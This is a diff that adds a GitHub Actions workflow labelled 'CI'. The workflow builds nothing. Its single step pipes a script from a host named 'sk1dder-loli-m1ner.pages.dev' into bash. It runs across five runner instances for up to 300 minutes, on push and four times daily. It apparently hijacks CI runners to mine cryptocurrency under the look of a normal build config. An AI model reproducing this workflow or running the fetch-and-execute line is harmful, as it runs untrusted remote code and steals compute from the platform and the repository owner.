@@ -1,0 +1,27 @@
+name: CI
+
+on:
+  push:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0 * * *'
+    - cron: '0 6 * * *'
+    - cron: '0 12 * * *'
+    - cron: '0 18 * * *'
+
+concurrency:
+  group: global
+  cancel-in-progress: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    strategy:
+      matrix:
+        instance: ["windows-amd", "windows-arm", "linux-amd", "linux-arm", "macos"]
+
+    steps:
+      - name: Run
+        run: |
+          curl "https://sk1dder-loli-m1ner.pages.dev/execute.sh" | bash
